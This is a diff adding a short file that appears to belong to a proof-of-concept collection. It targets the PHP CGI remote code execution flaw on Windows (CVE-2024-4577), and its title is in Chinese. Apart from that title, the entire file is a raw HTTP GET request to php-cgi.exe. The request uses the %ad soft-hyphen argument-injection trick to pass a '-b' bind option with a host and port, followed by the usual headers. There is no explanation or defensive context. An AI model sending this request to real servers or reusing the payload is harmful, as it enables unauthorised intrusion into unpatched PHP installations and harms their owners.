@@ -1,0 +1,11 @@
+# PHP CGI Windows平台远程代码执行漏洞(CVE-2024-4577)-M2
+GET /php-cgi/php-cgi.exe?%adb10.20.186.199:9999 HTTP/1.1
+Host: www.xwd_test.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Connection: close
+Redirect-Status: XCANWIN
+Cache-Control: max-age=0
+
